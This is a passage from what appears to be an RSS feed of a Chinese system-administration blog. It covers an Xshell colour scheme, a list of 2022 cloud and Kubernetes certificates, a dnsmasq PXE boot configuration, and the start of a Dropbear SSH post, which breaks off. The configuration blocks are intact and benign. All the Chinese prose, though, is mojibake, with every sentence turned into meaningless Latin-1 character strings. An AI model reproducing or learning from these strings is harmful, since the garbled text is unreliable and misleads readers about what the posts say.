&lt;p&gt;ä¸€ç›´åˆ°æœºæˆ¿æ”¹é€ å‰ï¼Œè¿˜éƒ½è§‰å¾—è¡Œï¼Œä½†æ˜¯æœºæˆ¿æ”¹é€ éœ€è¦æ”¶å›æ ¸å¿ƒäº¤æ¢æœºã€è·¯ç”±å™¨çš„æƒé™ï¼Œå¼€ç»ˆç«¯ console å±…ç„¶è¦æ”¶è´¹ä¼šå‘˜ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾è€åˆ˜æ¢å›äº†å…è´¹çš„xshell 7ã€‚&lt;/p&gt;
&lt;p&gt;xshellçš„é…è‰²å®åœ¨æ˜¯å—ä¸äº†ï¼Œè¿˜æ˜¯å–œæ¬¢ç»¿è‰²çš„å­—ç¬¦ç•Œé¢ã€‚&lt;/p&gt;
&lt;p&gt;å¤‡ä»½ä¸€ä¸ªç»¿è‰²çš„æ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mycolor&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;text&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;e9e9e9
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;magenta&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;ff00ff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;00ff80
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;white&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;fdf6e3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;green&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80ff00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;red&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;ff0000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;green&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;3c5a38
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;black&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;808080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;red&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ff4500
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;blue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;00bfff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;black&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;blue&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;1e90ff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yellow&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;ffff00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cyan&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bold&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;00ffff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;yellow&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;c0c000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;magenta&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;c000c0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;042028&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;white&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;c0c0c0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;cyan&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;00c0c0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Names&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;mycolor
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿å­˜æˆ mycolor.xcs æ–‡ä»¶ï¼Œç„¶åå·¥å…·&amp;ndash;&amp;gt; é…è‰²æ–¹æ¡ˆï¼Œå¯¼å…¥å³å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230112112243176&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230112-xshell_colors/image-20230112112243176.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ•´ä½“æ•ˆæœè¿˜æ˜¯æ¯”è¾ƒå¥½çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230112112306637&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230112-xshell_colors/image-20230112112306637.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ˜¯è‡ªå·±å–œæ¬¢çš„æ ·å­ï¼Œå½“ç„¶ï¼Œå­—ä½“ä»9ä¹Ÿå¢åŠ åˆ°äº†12ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>2022å¹´è·å¾—çš„è¯ä¹¦</title>
      <link>https://rendoumi.com/posts/20230103-certificates/</link>
      <pubDate>Tue, 03 Jan 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230103-certificates/</guid>
      <description>&lt;p&gt;2022å¹´ç»è¿‡åŠªåŠ›ï¼Œè€ƒäº†4å¼ è¯ä¹¦ï¼Œ2023å¹´ç»§ç»­åŠªåŠ›å¥‹æ–—&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;é˜¿é‡Œäº‘çš„ACPè¯ä¹¦ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230103121806291&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230103-certificates/image-20230103121806291.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;AWSçš„SAA-C03è¯ä¹¦ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230103121902909&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230103-certificates/image-20230103121902909.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;K8Sçš„CKAè¯ä¹¦ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230103121954249&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230103-certificates/image-20230103121954249.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;K8Sçš„CKSè¯ä¹¦ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20230103122032231&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230103-certificates/image-20230103122032231.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>DNSMASQé…ç½®PXEçš„æ–¹å¼</title>
      <link>https://rendoumi.com/posts/20221222-dnsmasq_pxe/</link>
      <pubDate>Thu, 22 Dec 2022 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221222-dnsmasq_pxe/</guid>
      <description>&lt;p&gt;DNSMASQåšå±€åŸŸç½‘å†…çš„pxe installlæ˜¯æœ€åˆé€‚ä¸è¿‡çš„è½¯ä»¶äº†ã€‚ä¸ç”¨å•ç‹¬æ­å»º tftpserverï¼Œç”¨è‡ªå»ºçš„å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;è€Œä¸”æ”¯æŒç»™å„ç§å­ç½‘æ‰“æ ‡ç­¾ï¼Œè¿˜å¯ä»¥æŒ‰æ ‡ç­¾å‘é€å„ç§dhcpåŒ…çš„ç‰¹å®šä¿¡æ¯ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;interface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;eth0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bind-dynamic
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pxe-prompt&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Rendoumi PXE System&amp;#34;&lt;/span&gt;, &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;domain-needed
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bogus-priv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;no-resolv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;no-poll
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#address=/jump.dedi.jp/install/103.108.236.5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#UP Stream DNS Server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;114.114.114.114
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;202.106.196.115
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;202.106.0.20
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;strict-order
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-authoritative
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-sequential-ip
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-no-override
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log-facility&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/log/dnsmasq.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log-dhcp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log-queries
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;enable-tftp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tftp-root &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /export/servers/tftpboot
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#only new add host is dynamic, delete or modify not.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-hostsfile=/etc/dhcp-host/hosts.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-hostsdir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc/dhcp-host
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Setup different options for each of the unique subnets, since default gateways will be different&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#The format for this is: dhcp-options=&amp;lt;your_tags_here&amp;gt;,&amp;lt;option&amp;gt;,&amp;lt;option_value&amp;gt; - &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#3 is router&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#1:netmask, 15:domain-name, 3:router, 6:dns-server,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#44:netbios-ns, 46:netbios-nodetype, 47:netbios-scope,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#31:router-discovery, 33:static-route, 121:classless-static-route,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#43:vendor-encap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-option&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;option:dns-server,172.18.30.1,172.18.30.2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-option&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;option:all-subnets-local,1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-option&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;option:T1,2m
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-option&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;option:T2,4m
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-range=[tag:&amp;lt;tag&amp;gt;[,tag:&amp;lt;tag&amp;gt;],][set:&amp;lt;tag&amp;gt;,]&amp;lt;start-addr&amp;gt;[,&amp;lt;end-addr&amp;gt;|&amp;lt;mode&amp;gt;][,&amp;lt;netmask&amp;gt;[,&amp;lt;broadcast&amp;gt;]][,&amp;lt;lease time&amp;gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#vlan 1 native vlan&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-range=set:net1,172.18.29.100,172.18.29.250,static,255.255.254.0,2m&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-range&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;set:net1,172.18.29.100,static,2m
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-option-force&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tag:net1,option:router,172.18.29.254
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#vlan 199 wuli&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-range=set:net2,172.18.31.100,static,255.255.254.0,2m&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-range=set:net2,172.18.31.100,255.255.254.0,2m&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-range&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;set:net2,172.18.31.100,static,2m
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-option-force&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tag:net2,option:router,172.18.31.254
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# set tag &amp;#34;ipxe&amp;#34; if request comes from iPXE (&amp;#34;iPXE&amp;#34; user class)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-userclass&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;set:ipxe,iPXE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# alternative way, look for option 175&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-match=set:ipxe,175 # gPXE/iPXE sends a 175 option.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# if request comes from dumb firmware, send them iPXE (via TFTP)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-boot=tag:!ipxe,undionly.kpxe,boothost,172.18.29.2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-boot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tag:!ipxe,undionly.kpxe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# if request comes from iPXE, direct it to boot from boot1.php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-boot=tag:ipxe,http://172.18.29.2/pxeboot/boot1.php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#--dhcp-boot=[tag:&amp;lt;tag&amp;gt;,]&amp;lt;filename&amp;gt;,[&amp;lt;servername&amp;gt;[,&amp;lt;server address&amp;gt;|&amp;lt;tftp_servername&amp;gt;]]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-boot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tag:ipxe,tag:net1,http://172.18.29.2/pxeboot/boot1.php,172.18.29.2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-boot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tag:ipxe,tag:net2,http://172.18.31.2/pxeboot/boot1.php,172.18.31.2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Args add(old del) mac ip hostname&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# add ac:1f:6b:21:3e:d8 103.108.236.22 1403-s27&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-script=/bin/echo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dhcp-leasefile=/var/log/dnsmasq.leases&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# !!!! tag is alphanumeric label, fuck !!!!!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é™„ä¸Šundionly.kpxeï¼š&lt;a href=&#34;./undionly.kpxe&#34;&gt;undionly.kpxe&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dropbearé…ç½®SSHæœåŠ¡</title>
      <link>https://rendoumi.com/posts/20221219-dropbear/</link>
      <pubDate>Mon, 19 Dec 2022 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221219-dropbear/</guid>
      <description>&lt;p&gt;åˆè§„å®¡è®¡ç»å¸¸éœ€è¦ç»™å„ç§è½¯ä»¶æ‰“è¡¥ä¸ï¼Œæ¯”å¦‚opensshï¼Œå¦‚æœæ˜¯é«˜ç‰ˆæœ¬è¿˜å¥½è¯´ã€‚å¦‚æœè®©ä½ è¡¥ centos 6çš„ opensshï¼Œ&lt;/p&gt;
&lt;p&gt;é‚£ææ€•å°±è¦å–ä¸€å£¶äº†ã€‚æ›¿ä»£æ–¹æ¡ˆå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;gitï¼šhttps://github.com/mkj/dropbear
ä¸‹è½½åœ°å€ï¼šhttps://matt.ucc.asn.au/dropbear/dropbear.html&lt;/p&gt;
&lt;p&gt;ä¸€ã€ä»‹ç»
